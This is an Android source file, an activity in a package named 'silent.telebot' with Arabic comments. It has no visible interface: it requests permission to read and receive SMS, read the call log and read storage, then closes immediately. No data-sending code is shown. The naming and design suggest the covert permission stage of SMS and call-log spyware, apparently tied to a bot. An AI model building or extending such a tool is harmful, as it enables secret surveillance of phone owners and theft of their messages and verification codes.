package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // إذا كان الإصدار أقل من 6.0، الأذونات تمنح تلقائياً
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            finish();
            return;
        }

        // تحقق من جميع الأذونات (بما فيها التخزين)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            finish(); // كل شيء ممنوح، ننهي النشاط
            return;
        }

        // طلب الأذونات (الرسائل، سجل المكالمات، التخزين)
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE   // صلاحية التخزين
        }, REQ_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ جميع الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "❌ بعض الأذونات مرفوضة، قد لا يعمل التطبيق بشكل كامل", Toast.LENGTH_LONG).show();
            }
        }
        finish();
    }
}
